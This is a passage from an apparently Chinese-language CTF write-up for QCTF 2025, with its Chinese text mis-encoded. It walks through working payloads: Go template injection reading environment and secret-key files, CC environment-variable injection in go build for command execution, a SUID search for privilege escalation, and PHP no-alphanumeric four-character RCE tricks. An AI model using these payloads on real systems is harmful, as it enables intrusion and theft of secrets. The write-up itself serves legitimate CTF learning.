</span></span><span class="line"><span class="cl">	<span class="nx">cmd</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;go&#34;</span><span class="p">,</span> <span class="s">&#34;build&#34;</span><span class="p">,</span> <span class="s">&#34;-o&#34;</span><span class="p">,</span> <span class="nx">outputFileName</span><span class="p">,</span> <span class="s">&#34;main.go&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">cmd</span><span class="p">.</span><span class="nx">Dir</span> <span class="p">=</span> <span class="nx">BuildDir</span>
</span></span><span class="line"><span class="cl">	<span class="nx">cmd</span><span class="p">.</span><span class="nx">Env</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nf">Environ</span><span class="p">(),</span> <span class="nx">envs</span><span class="o">...</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">output</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">cmd</span><span class="p">.</span><span class="nf">CombinedOutput</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">,</span> <span class="nx">gin</span><span class="p">.</span><span class="nx">H</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;error&#34;</span><span class="p">:</span>   <span class="s">&#34;ç¼–è¯‘å¤±è´¥&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;details&#34;</span><span class="p">:</span> <span class="nb">string</span><span class="p">(</span><span class="nx">output</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">		<span class="p">})</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">c</span><span class="p">.</span><span class="nf">File</span><span class="p">(</span><span class="nx">filepath</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">BuildDir</span><span class="p">,</span> <span class="nx">outputFileName</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251107154756335.png"
	width="1249"
	height="792"
	srcset="/p/qctf2025/image-20251107154756335_hu6329546208447891453.png 480w, /p/qctf2025/image-20251107154756335_hu16881071895516916269.png 1024w"
	loading="lazy"
	
		alt="image-20251107154756335"
	
	
		class="gallery-image" 
		data-flex-grow="157"
		data-flex-basis="378px"
	
></p>
<p>ä¹‹å‰è€ƒè¿‡ä¸€æ¬¡goè¯­è¨€çš„sstiï¼Œé‚£æ¬¡çš„<code>{{.}}</code>æœ‰base64æ¨¡å—å’Œexecï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™ä¸€æ¬¡æ˜¯Getenvå’ŒUtilsæ¨¡å—ï¼Œç»“åˆåé¢è¦å»çš„vipä¸“åŒºä¸­éœ€è¦å¯†é’¥ï¼Œæ¨æµ‹è¿™é‡Œéœ€è¦é€šè¿‡sstiè¯»å–å¯†é’¥</p>
<p>è§‚å¯Ÿé™„ä»¶æºç ï¼Œå‘ç°Utilsä¸­æœ‰GetReaderå’ŒReadallæ–¹æ³•</p>
<p><img src="/p/qctf2025/image-20251107162437030.png"
	width="845"
	height="472"
	srcset="/p/qctf2025/image-20251107162437030_hu599624456767393955.png 480w, /p/qctf2025/image-20251107162437030_hu2440555776789214723.png 1024w"
	loading="lazy"
	
		alt="image-20251107162437030"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="429px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{.Utils.ReadAll (.Utils.GetReader (&#34;/proc/self/environ&#34;))}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨æ„ç©ºæ ¼æ ¼å¼</p>
<p><img src="/p/qctf2025/image-20251107162901333.png"
	width="1186"
	height="760"
	srcset="/p/qctf2025/image-20251107162901333_hu9238143288436420773.png 480w, /p/qctf2025/image-20251107162901333_hu17362340032976555776.png 1024w"
	loading="lazy"
	
		alt="image-20251107162901333"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="374px"
	
></p>
<p>çœ‹åˆ°Secretkeyçš„è·¯å¾„äº†ç›´æ¥è¯»</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{.Utils.ReadAll (.Utils.GetReader (&#34;/app/secret_key.txt&#34;))}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251107163012747.png"
	width="1160"
	height="636"
	srcset="/p/qctf2025/image-20251107163012747_hu11352761823017147334.png 480w, /p/qctf2025/image-20251107163012747_hu7766723028129315.png 1024w"
	loading="lazy"
	
		alt="image-20251107163012747"
	
	
		class="gallery-image" 
		data-flex-grow="182"
		data-flex-basis="437px"
	
></p>
<p>è·å¾—å¯†é’¥ä¹‹åå°±å¯ä»¥ç”¨vipçš„åŠŸèƒ½äº†</p>
<p>vipåŠŸèƒ½ä¸ºä¸€ä¸ªgoè¯­è¨€çš„ç¼–è¯‘å™¨ï¼Œè¿™é‡Œå­˜åœ¨ç¯å¢ƒå˜é‡æ³¨å…¥çš„æ¼æ´ï¼Œä»¥åé‡åˆ°goç¼–è¾‘å™¨å‡ ä¹å°±æ˜¯è¿™ç§é¢˜äº†</p>
<p><a class="link" href="https://xz.aliyun.com/news/16893"  target="_blank" rel="noopener"
    >Go build ç¯å¢ƒå˜é‡æ³¨å…¥RCE-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p>åœ¨Goç¯å¢ƒå˜é‡ä¸­æœ‰ä¸€ä¸ªCCå˜é‡ï¼Œè¿™æ˜¯ä¸ªæŒ‡ä»¤ã€‚</p>
<p>åŸæœ¬æ˜¯CC=gccï¼Œå¯ä»¥ç¼–è¯‘Cã€‚è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå‘½ä»¤æ³¨å…¥çš„ç‚¹ä½</p>
<p>æ€ä¹ˆæ³¨å…¥ï¼Ÿéœ€è¦æ„é€ æ€æ ·çš„payloadå‘¢ï¼Ÿ</p>
<p>é¦–å…ˆçœ‹çœ‹æ€ä¹ˆå®šä¹‰CC</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;CC&#34;: &#34;/bin/sh -c &#39;...; gcc \&#34;$@\&#34;&#39; gcc-shim&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>/bin/sh -c '...'</code> è¡¨ç¤ºæ‰§è¡Œå•å¼•å·å†…çš„å­—ç¬¦ä¸²ä½œä¸º shell å‘½ä»¤ã€‚</p>
<p><code>gcc &quot;$@&quot;</code>: è¿™æ˜¯ä¸ºäº†<strong>ä¼ªè£…å’Œæ¬ºéª—</strong>ã€‚åœ¨æ¶æ„å‘½ä»¤æ‰§è¡Œå®Œæ¯•åï¼Œè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œ <code>gcc</code>ã€‚<code>&quot;$@&quot;</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ shell å˜é‡ï¼Œå®ƒä¼šæŠŠä¼ é€’ç»™è¿™ä¸ªè„šæœ¬çš„æ‰€æœ‰å‚æ•°åŸå°ä¸åŠ¨åœ°ä¼ ç»™ <code>gcc</code>ã€‚è¿™æ ·ï¼ŒGo ç¼–è¯‘è¿‡ç¨‹å°±èƒ½æ­£å¸¸å®Œæˆï¼Œä¸ä¼šå› ä¸ºæ‰¾ä¸åˆ° C ç¼–è¯‘å™¨è€ŒæŠ¥é”™ã€‚ï¼ˆå¯æœ‰å¯æ— ï¼Œé¡ºå¸¦ä¸€æï¼Œ gcc-shimä¹Ÿå¯æœ‰å¯æ— ï¼‰</p>
<p>å¥½ï¼Œåˆ°è¿™ä¸€æ­¥å·²ç»å‡†å¤‡å¥½å‘½ä»¤æ³¨å…¥äº†ã€‚ä½†æ˜¯è¦è°ƒç”¨CCè¿™ä¸ªæŒ‡ä»¤ï¼Œæˆ‘ä»¬éœ€è¦å¯¼å…¥import &ldquo;C&rdquo;ã€‚</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥ç»™å‡ºå®Œæ•´çš„payload</p>
<p>payloadæ˜¯jsonå½¢å¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> 
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;code&#34;</span><span class="p">:</span> <span class="s2">&#34;package main\nimport \&#34;C\&#34;\n\nfunc main() {}&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;env&#34;</span><span class="p">:</span> <span class="p">{</span>   
</span></span><span class="line"><span class="cl">		<span class="nt">&#34;CGO_ENABLED&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>   
</span></span><span class="line"><span class="cl">		<span class="nt">&#34;GOOS&#34;</span><span class="p">:</span> <span class="s2">&#34;linux&#34;</span><span class="p">,</span>   
</span></span><span class="line"><span class="cl">		<span class="nt">&#34;CC&#34;</span><span class="p">:</span> <span class="s2">&#34;/bin/sh -c &#39;......; gcc \&#34;$@\&#34;&#39; gcc-shim&#34;</span> 
</span></span><span class="line"><span class="cl">		<span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>import &quot;C&quot;</code> ä¼šå¼ºåˆ¶ Go ç¼–è¯‘å™¨å¯ç”¨ Cgoï¼Œå³è°ƒç”¨ C è¯­è¨€å·¥å…·é“¾ï¼ˆç¼–è¯‘å™¨ã€é“¾æ¥å™¨ï¼‰æ¥å¤„ç† C ä»£ç éƒ¨åˆ†ã€‚<strong>è¿™æ˜¯è§¦å‘æ¼æ´çš„å…³é”®ã€‚</strong> å¦‚æœæ²¡æœ‰ <code>import &quot;C&quot;</code>ï¼ŒGo ç¼–è¯‘å™¨ä¼šå¿½ç•¥ <code>CC</code> å’Œ <code>CGO_*</code> ç›¸å…³çš„ç¯å¢ƒå˜é‡ã€‚</p>
<p>ç¯å¢ƒå˜é‡è¿˜å®šä¹‰äº†<code>&quot;CGO_ENABLED&quot;: &quot;1&quot;</code> å’Œ <code>&quot;GOOS&quot;: &quot;linux&quot;</code>: è¿™ä¸¤ä¸ªæ˜¯è¾…åŠ©ï¼Œç¡®ä¿ Cgo è¢«å¯ç”¨å¹¶æŒ‡å®šç›®æ ‡ç³»ç»Ÿã€‚</p>
<p>å¥½ï¼Œåˆ°è¿™é‡Œï¼Œå¦‚æœæ˜¯å‡ºç½‘çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥ç”¨åå¼¹shellè§£å†³äº†ã€‚ä½†é—®é¢˜è¿™é‡Œçš„ç¯å¢ƒæ˜¯ä¸å‡ºç½‘çš„ã€‚åˆè¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿ</p>
<p>å¯ä»¥ç”¨<code>&gt;&amp;2</code>é‡å®šå‘è§£å†³å›æ˜¾çš„é—®é¢˜</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;CC&#34;: &#34;/bin/sh -c &#39;ls -al / &gt;&amp;2; false&#39;&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&amp;2é‡å®šå‘åˆ°é”™è¯¯è¾“å‡ºï¼Œåé¢falseå¼ºåˆ¶é”™è¯¯ï¼Œæ‰€ä»¥ä¸€å®šä¼šè¾“å‡º
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251113171051207.png"
	width="1392"
	height="863"
	srcset="/p/qctf2025/image-20251113171051207_hu664170837712915526.png 480w, /p/qctf2025/image-20251113171051207_hu3675878037659837595.png 1024w"
	loading="lazy"
	
		alt="image-20251113171051207"
	
	
		class="gallery-image" 
		data-flex-grow="161"
		data-flex-basis="387px"
	
></p>
<p>flag.txtï¼Œç›´æ¥è¯»ï¼Œæ˜¾ç¤ºæˆ‘ä»¬æ²¡æœ‰æƒé™</p>
<p><img src="/p/qctf2025/image-20251113171157195.png"
	width="1415"
	height="599"
	srcset="/p/qctf2025/image-20251113171157195_hu18012290720006768093.png 480w, /p/qctf2025/image-20251113171157195_hu16459397248809021773.png 1024w"
	loading="lazy"
	
		alt="image-20251113171157195"
	
	
		class="gallery-image" 
		data-flex-grow="236"
		data-flex-basis="566px"
	
></p>
<p>é‚£å°±è¦ææƒäº†</p>
<p>æ‰¾ä¸€ä¸‹æ‰€æœ‰å…·æœ‰ç‰¹æ®Šæƒé™suidçš„æ–‡ä»¶ï¼Œè¿”å›å‰äº”ä¸ª</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -type f -perm /4000 2&gt;/dev/null | head -5
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251113171805529.png"
	width="1332"
	height="707"
	srcset="/p/qctf2025/image-20251113171805529_hu8213948344525236556.png 480w, /p/qctf2025/image-20251113171805529_hu8832568092940237734.png 1024w"
	loading="lazy"
	
		alt="image-20251113171805529"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="452px"
	
></p>
<p>ç›´æ¥æ‰§è¡Œ</p>
<p><img src="/p/qctf2025/image-20251113172049513.png"
	width="1376"
	height="649"
	srcset="/p/qctf2025/image-20251113172049513_hu5320134875085469633.png 480w, /p/qctf2025/image-20251113172049513_hu14813861295559399981.png 1024w"
	loading="lazy"
	
		alt="image-20251113172049513"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="508px"
	
></p>
<p>è¿™ä¸ªæ–¹æ³•å°±å’Œæ­£å¸¸æ‹¿shellä¸€æ ·ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å®˜æ–¹çš„è„šæœ¬wpä¸æ˜¯è¿™æ ·çš„ï¼Œæ˜¯ç”¨go embed</p>
<p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç”¨<code>go embed</code></p>
<p>Go embed ç‰¹æ€§ : Go è¯­è¨€åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šå°†è¢« embed çš„æ–‡ä»¶ä¸€èµ·æ‰“åŒ…åˆ°äºŒè¿›åˆ¶ç¨‹åºå†…éƒ¨</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬é€šè¿‡å‘½ä»¤æ³¨å…¥å¯ä»¥å°†flagå†™å…¥ä¸€ä¸ªè¢«embedçš„æ–‡ä»¶ï¼Œç„¶åä¸€èµ·æ‰“åŒ…å‡ºæ¥ã€‚</p>
<p><code>embed</code> ç‰¹æ€§é€šè¿‡ <code>//go:embed</code> æŒ‡ä»¤æ¥å®ç°ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ç”¨æ³•ï¼š</p>
<p>åµŒå…¥å•ä¸ªæ–‡ä»¶demo</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="nx">_</span> <span class="s">&#34;embed&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//go:embed hello.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">s</span> <span class="kt">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><code>//go:embed hello.txt</code>ï¼šè¡¨ç¤ºå°† <code>hello.txt</code> æ–‡ä»¶çš„å†…å®¹åµŒå…¥åˆ°å˜é‡ <code>s</code> ä¸­ã€‚</p>
</li>
<li>
<p><code>s</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ï¼Œå­˜å‚¨äº† <code>hello.txt</code> æ–‡ä»¶çš„å†…å®¹ã€‚</p>
</li>
<li>
<p>è¿è¡Œç¨‹åºæ—¶ï¼Œ<code>s</code> çš„å€¼å°±æ˜¯ <code>hello.txt</code> æ–‡ä»¶çš„å†…å®¹ã€‚</p>
</li>
</ul>
<p>æ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸€ä¸ªå‘½ä»¤å°†å‘½ä»¤ç»“æœå†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åç”¨embedæ‰“åŒ…ä¸€èµ·è°ƒå‡ºæ¥</p>
<p>æ„å»ºç¬¬äºŒä¸ªpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&#34;code&#34;</span><span class="p">:</span> <span class="s2">&#34;package main\nimport (_ \&#34;embed\&#34;; \&#34;os\&#34;)\n\n//go:embed s.txt\nvar f []byte\n\nfunc main() { os.Stdout.Write(f) }&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&#34;env&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;CGO_ENABLED&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;GOOS&#34;</span><span class="p">:</span> <span class="s2">&#34;linux&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>envéƒ¨åˆ†ç›¸åŒ</p>
<p>codeéƒ¨åˆ†ï¼š</p>
<p><code>import (_ &quot;embed&quot;; &quot;os&quot;)</code>: å¯¼å…¥äº†ä¸¤ä¸ªå…³é”®åŒ…ã€‚<code>embed</code> ç”¨äºåœ¨ç¼–è¯‘æ—¶åµŒå…¥æ–‡ä»¶ï¼Œ<code>os</code> ç”¨äºå°†å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚</p>
<p><code>//go:embed s.txt</code>: è¿™æ˜¯ Go 1.16+ å¼•å…¥çš„ç¼–è¯‘å™¨æŒ‡ä»¤ã€‚å®ƒå‘Šè¯‰ç¼–è¯‘å™¨ï¼Œåœ¨<strong>ç¼–è¯‘æ—¶</strong>æŸ¥æ‰¾ <code>s.txt</code> æ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹åµŒå…¥åˆ°ä¸‹é¢çš„å˜é‡ä¸­ã€‚</p>
<p><code>var f []byte</code>: è¿™ä¸ªå˜é‡ <code>f</code> å°†åœ¨ç¼–è¯‘ååŒ…å« <code>s.txt</code> çš„æ‰€æœ‰å†…å®¹ã€‚</p>
<p><code>func main() { os.Stdout.Write(f) }</code>: ç¨‹åºè¿è¡Œæ—¶ï¼Œå®ƒåªåšä¸€ä»¶äº‹ï¼šå°† <code>f</code> å˜é‡ï¼ˆå³ <code>s.txt</code> çš„å†…å®¹ï¼‰å°åˆ°å±å¹•ä¸Šã€‚</p>
<p>ä½†æ˜¯æˆ‘è‡ªå·±åšå®éªŒçš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰ä¸€èµ·æ‰“åŒ…å‡ºæ¥ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œè¿™é‡Œæš‚æ—¶å°±è¿™æ ·å§ã€‚</p>
<h3 id="ez_php">ez_php
</h3><h4 id="çŸ¥è¯†ç‚¹éæ³•å˜é‡åä¼ å‚æ— å­—æ¯æ•°å­—--å››å­—ç¬¦rce">çŸ¥è¯†ç‚¹ï¼šéæ³•å˜é‡åä¼ å‚ã€æ— å­—æ¯æ•°å­— + å››å­—ç¬¦rce
</h4><p><img src="/p/qctf2025/image-20251114101712549.png"
	width="565"
	height="295"
	srcset="/p/qctf2025/image-20251114101712549_hu3677365725342808228.png 480w, /p/qctf2025/image-20251114101712549_hu1574105426145306806.png 1024w"
	loading="lazy"
	
		alt="image-20251114101712549"
	
	
		class="gallery-image" 
		data-flex-grow="191"
		data-flex-basis="459px"
	
></p>
<p>è€ƒè¿‡å¾ˆå¤šæ¬¡äº†ï¼Œå°±æ˜¯+å’Œ&amp;è¦ä¼ è¿›å»çš„è¯éœ€è¦urlç¼–ç ä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c1n%5by0.u%20g3t%2bfl%26g
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251114104331944.png"
	width="967"
	height="703"
	srcset="/p/qctf2025/image-20251114104331944_hu6681185403189977145.png 480w, /p/qctf2025/image-20251114104331944_hu5226675364367539425.png 1024w"
	loading="lazy"
	
		alt="image-20251114104331944"
	
	
		class="gallery-image" 
		data-flex-grow="137"
		data-flex-basis="330px"
	
></p>
<p>ç„¶åæ˜¯é™é•¿çš„æ— å­—æ¯æ•°å­—rceï¼Œç»™äº†flagçš„ä½ç½®</p>
<p>ç½‘ä¸Šæœ‰å¾ˆå¤šç›¸å…³æ–‡ç« ï¼Œå¯ä»¥å‘ç°å–åæ˜¯å­—ç¬¦æ•°æœ€å°‘çš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s2">&#34;whoami&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1">//%88%97%90%9E%92%96
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åç”¨ <code> ``</code> æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ç¼©çŸ­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=$_=~%88%97%90%9E%92%96;echo%20`$_`
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯è¿˜æ˜¯å¤ªé•¿äº†ï¼Œæˆ‘ä»¬åœ¨å»é™¤echoçš„æƒ…å†µä¸‹éœ€è¦ç”¨åˆ°æ€»è®¡10ä¸ªå­—ç¬¦</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$_=~;echo%20`$_`
</span></span></code></pre></td></tr></table>
</div>
</div><p>é™é•¿åå››ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä¼ å››ä¸ªå­—ç¬¦ã€‚å¸¸è§„æ‰§è¡Œè‚¯å®šæ˜¯ä¸è¡Œäº†ï¼Œè¿™é‡Œåº”è¯¥å¯ä»¥æƒ³åˆ°å››å­—ç¬¦rce</p>
<p>é¢„å¤‡çŸ¥è¯†ï¼š
1.è¾“å…¥ç»Ÿé…ç¬¦<code>*</code> ï¼ŒLinuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt;id
</span></span><span class="line"><span class="cl">&gt;root
</span></span><span class="line"><span class="cl">*           ï¼ˆç­‰åŒäºå‘½ä»¤ï¼šid rootï¼‰
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå·§å¦™çš„åœ°æ–¹å°±æ¥äº†</p>
<p><code>&gt;cat</code>ï¼šåœ¨å½“å‰ç›®å½•ä¸‹å†™å…¥æ–‡ä»¶åä¸ºcatçš„æ–‡ä»¶</p>
<p>æ­¤æ—¶lså¯ä»¥å¾—åˆ°ï¼š<code>cat  flag.php  index.php</code></p>
<p>ç„¶åæˆ‘ä»¬ç”¨ <code>*&gt;=</code>å°±å¯ä»¥å°†flag.phpå†™å…¥=æ–‡ä»¶ä¸­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c1n[y0.u%20g3t%2Bfl%26g?=$_=~%C1%9C%9E%8B;`$_`;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?c1n[y0.u%20g3t%2Bfl%26g?=`*&gt;=`;
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åè®¿é—®<code>=</code></p>
<p><img src="/p/qctf2025/image-20251114150446466.png"
	width="1595"
	height="851"
	srcset="/p/qctf2025/image-20251114150446466_hu10002312944490753569.png 480w, /p/qctf2025/image-20251114150446466_hu1465041251378515572.png 1024w"
	loading="lazy"
	
		alt="image-20251114150446466"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="449px"
	
></p>
<h3 id="mysqlç®¡ç†å·¥å…·">mysqlç®¡ç†å·¥å…·
</h3><h4 id="çŸ¥è¯†ç‚¹jwtçˆ†ç ´mysqlä»»æ„æ–‡ä»¶è¯»å–yamlååºåˆ—åŒ–">çŸ¥è¯†ç‚¹ï¼šJWTçˆ†ç ´ã€Mysqlä»»æ„æ–‡ä»¶è¯»å–ã€yamlååºåˆ—åŒ–
</h4><p>æºä»£ç è·å–ç™»å½•è´¦å·<code>user/pass</code></p>
